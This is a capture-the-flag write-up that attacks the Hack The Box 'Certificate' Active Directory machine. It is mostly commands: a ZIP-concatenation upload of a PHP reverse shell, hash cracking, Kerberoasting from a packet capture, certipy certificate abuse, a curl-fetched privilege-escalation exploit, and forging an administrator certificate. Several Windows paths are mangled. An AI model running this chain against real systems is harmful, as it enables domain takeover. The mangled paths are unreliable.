# HTB Certificate - Writeup (English)

**Platform:** Windows  
**IP:** 10.10.11.71  
**Difficulty:** Hard  
**Author:** NoSec

---

## Recon

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb)
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb)
3269/tcp open  ssl/ldap
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
Service Info: Host: DC01; OS: Windows
```

### Clock-skew

- Kerberos requires time sync!
  ```bash
  sudo rdate -n certificate.htb
  ```

## Web - RCE via file upload

You can register on the site, and when clicking "Enroll" on a course, you get this URL:

```
http://certificate.htb/upload.php?s_id=36
```

Only PDF and ZIP files are accepted.  
Used ZIP concatenation trick to include a PHP shell at the end (with valid ZIP structure).

### Steps

1. Create the reverse shell (`shell.php`)

```php
<?php
// php-reverse-shell by pentestmonkey (slimmed down version)
// [code omitted for brevity]
?>
```

2. Create an empty PDF (e.g. `test.pdf`)  
3. Concatenate ZIPs:

```bash
zip head.zip test.pdf
zip -r tail.zip nosechere   # nosechere/shell.php
cat head.zip tail.zip > main.zip
```

4. Upload `main.zip`  
5. Browse the shell:

```
http://certificate.htb/static/uploads/[...]/nosechere/shell.php
```

6. Set up listener:

```bash
nc -lvnp 4444
```

Shell access: `xamppuser`

## Enumeration: DB access

Command:

```cmd
.\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -e "use certificate_webapp_db; select * from users;"  -E
```

Notable user:

- username: `sara.b`
- bcrypt hash: `$2y$04$...`

### Crack hash

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Password: `Bl******`**

### WinRM access

```bash
evil-winrm -i 10.10.11.71 -u Sara.B -p 'Bl******'
```

> **Note:**  
> HTB patched password change via lion.sk on June 10, 2025 â use alternate method!

## PCAP analysis â Kerberos hash

- File: `WS-01_PktMon.pcap` (Kerberos traffic)
- Contains a TGS-REQ. Can be used for Kerberoasting if SPN is registered.
- Use `Krb5RoastParser`:
>  https://github.com/jalvarezz13/Krb5RoastParser

```bash
python krb5_roast_parser.py WS-01_PktMon.pcap as_req >> hash.txt
```

### Crack with Hashcat

```bash
hashcat -m 19900 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

**Password: `!QA*****`**

---

## Certipy â Getting PFX

### Lion.SK

```bash
certipy req -u 'lion.sk@CERTIFICATE.HTB' -p "\!QA<pass>" -dc-ip '10.10.11.71' -target 'DC01.CERTIFICATE.HTB' -ca 'Certificate-LTD-CA' -template 'Delegated-CRA'
```

### Ryan.K (On-Behalf-Of)

```bash
certipy req -u 'lion.sk@CERTIFICATE.HTB' -p "\!QA<pass>" -dc-ip '10.10.11.71' -target 'DC01.CERTIFICATE.HTB' -ca 'Certificate-LTD-CA' -template 'SignedUser' -pfx 'lion.sk.pfx' -on-behalf-of 'CERTIFICATE\ryan.k'
```

### Extract NTLM hash

```bash
certipy auth -pfx 'ryan.k.pfx' -dc-ip '10.10.11.71'
```

### WinRM:

```bash
evil-winrm -i 10.10.11.71 -u ryan.k -H [ryan.k_hash]
```

## Privilege Escalation

Check privileges:

```powershell
whoami /priv
```

**Found: `SeManageVolumePrivilege`**

### Download/Run exploit

https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public

```bash
curl 10.10.14.8/SeManageVolumeExploit.exe -O SeManageVolumeExploit.exe
.\SeManageVolumeExploit.exe
```

### Test:

```powershell
echo "test" > C:\Windows	est.txt
type C:\Windows	est.txt
```

## Export Certificate Authority cert

```powershell
mkdir /temp
certutil -exportPFX my "Certificate-LTD-CA" C:	emp\ca.pfx
```

Download:

```
download ca.pfx
```

## Forge Admin certificate

```bash
certipy forge -ca-pfx ca.pfx -upn 'administrator@certificate.htb' -out forged_admin.pfx
```

## Get Administrator NTLM hash

```bash
certipy auth -dc-ip '10.10.11.71' -pfx 'forged_admin.pfx' -username 'administrator' -domain 'certificate.htb'
```

## Root / Administrator access

```bash
evil-winrm -i 10.10.11.71 -u administrator -H d80430<hash>
```

You should see:

```
user.txt and root.txt under respective Desktop directories
```

---

## Notes & Takeaways

**What I learned:**

- Modern AD attack chain
- ZIP concatenation trick
- ADCS/PKI abuse
- Kerberoast (from PCAP)
- Shadow Credentials / PrivEsc
- Cert forgery via CA access

**Traps, mistakes, advice**

- Time sync is **mandatory**
- Password change patch applied by HTB on 2025-06-10

## Summary

Certificate is an excellent machine to practice ADCS compromise.  
Highly recommended for anyone interested in modern AD / Red Teaming / Blue Teaming / PKI attacks.  
Feel free to reach out with any questions.